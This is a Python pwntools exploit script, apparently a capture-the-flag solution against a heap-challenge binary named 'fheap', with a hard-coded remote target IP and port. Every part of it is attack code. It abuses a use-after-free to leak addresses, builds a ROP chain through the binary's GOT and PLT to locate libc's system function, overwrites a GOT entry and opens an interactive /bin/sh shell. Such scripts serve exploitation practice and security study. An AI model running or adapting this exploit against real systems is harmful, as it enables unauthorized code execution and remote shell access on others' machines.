#! /usr/bin/python
from pwn import *

# switches
DEBUG = 0
LOCAL = 1
VERBOSE = 1
 
# modify this
if LOCAL:
    target = process('./fheap')
else:
    target = remote('119.28.62.216',10023)
 
if VERBOSE: context.log_level = 'debug'


def creatROP():
    ropchain = p64(addr + 0x00000000000011e3) # pop rdi
    ropchain += p64(addr + 0x202070)# got@malloc
    ropchain += p64(addr + 0x0000000000000990)# plt@put
    ropchain += p64(addr + 0x00000000000011DA)# magic
    ropchain += p64(0)# rbx
    ropchain += p64(1)# rbp
    ropchain += p64(addr + 0x0000000000202058)# r12 -> rip got@read
    ropchain += p64(8)# r13 -> rdx
    ropchain += p64(addr + 0x0000000000202078)# r14 -> rsi got@atoi
    ropchain += p64(0)# r15 -> rdi
    ropchain += p64(addr + 0x00000000000011C0)# magic
    ropchain += 'a'*8*7
    ropchain += p64(addr + 0x0000000000000B65)# getInt
    ropchain = 'yes AAAA'+ropchain
    return ropchain

def create(size, string):
    target.recvuntil('quit')
    target.sendline('create ')
    target.recvuntil('size:')
    target.sendline(str(size))
    target.recvuntil('str:')
    target.send(string)

def delete(id,payload='yes'):
    target.recvuntil('quit')
    target.sendline('delete ')
    target.recvuntil('id:')
    target.sendline(str(id))
    target.recvuntil('sure?:')
    target.sendline(payload)


if DEBUG: gdb.attach(target)

a = raw_input('go2?')
create(4, 'aaa\n')
#a = raw_input('go?')
create(4, 'aaa\n')
#delete(0)
delete(1)
delete(0)
#create(4, '\x00')
gdb.attach(target)
create(0x20, 'a' * 0x16 + 'lo' + '\x2d')
delete(1)

target.recvuntil('lo')
addr = target.recvline()
addr = addr[:-1]
put_addr = u64(addr + '\x00' * (8 - len(addr)))
print 'putBase:'+str(hex(put_addr))

addr = u64(addr + '\x00' * (8 - len(addr))) - 0xd2d
print 'mainBase:',

print hex(addr)

delete(0)
#create(4, '\x00')

payload1 = 'a' * 0x18 + p64(0x00000000000011DC + addr)
create(0x20,payload1)

ropchain = creatROP()
delete(1,ropchain)
addr = target.recvline()[:-1]
addr = u64(addr + '\x00' * (8 - len(addr)))
print "malloc_addr:",
print hex(addr)
addr = addr - 534112 + 288144
#addr = addr - 537984 + 283536
print 'System_addr:',
print hex(addr)
print 'LibBase:',
print hex(addr)

target.sendline(p64(addr)+'/bin/sh')
target.interactive()
